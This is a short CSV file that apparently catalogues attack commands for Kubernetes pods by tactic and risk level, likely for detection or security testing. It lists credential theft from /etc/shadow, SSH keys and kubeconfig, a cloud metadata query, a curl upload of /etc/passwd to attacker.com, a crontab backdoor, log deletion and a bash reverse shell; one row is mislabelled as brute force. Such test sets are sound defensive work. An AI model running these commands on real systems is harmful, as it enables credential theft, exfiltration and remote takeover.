Category,Name,Command,Risk,PodTarget
Credential Access,Shadow File Read,cat /etc/shadow,Critical,any-pod
Credential Access,Passwd File Read,cat /etc/passwd,High,any-pod
Credential Access,SSH Key Steal,cat ~/.ssh/id_rsa,Critical,any-pod
Credential Access,Kubeconfig Steal,cat /root/.kube/config,Critical,kube-system
Credential Access,AWS Metadata Steal,curl http://169.254.169.254/latest/meta-data/,Critical,cloud-pod
Discovery,Process Listing,ps aux,Low,any-pod
Discovery,Network Config,ifconfig -a,Low,any-pod
Discovery,K8s Service Discovery,curl -k https://kubernetes.default/api/v1/namespaces,Medium,any-pod
Exfiltration,Data Upload,curl -X POST -d @/etc/passwd http://attacker.com/collect,High,any-pod
Lateral Movement,SSH Brute Force,ssh-keygen -t rsa -N "" -f /tmp/id_rsa,Medium,any-pod
Persistence,Cronjob Backdoor,echo "* * * * * root /tmp/malicious.sh" >> /etc/crontab,High,any-pod
Defense Evasion,Log Deletion,rm -rf /var/log/syslog,High,any-pod
Execution,Reverse Shell,bash -i >& /dev/tcp/attacker.com/4444 0>&1,Critical,any-pod
